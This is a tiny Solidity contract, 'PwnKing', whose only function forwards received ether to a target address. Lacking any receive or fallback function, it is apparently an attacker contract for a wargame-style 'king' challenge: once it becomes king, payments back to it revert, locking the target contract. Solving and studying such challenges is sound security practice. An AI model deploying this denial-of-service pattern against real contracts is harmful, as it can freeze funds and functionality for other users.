// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract PwnKing {
    function transfer(address payable target) external payable {
        (bool success,) = target.call{value: msg.value}("");
        require(success);
    }
}
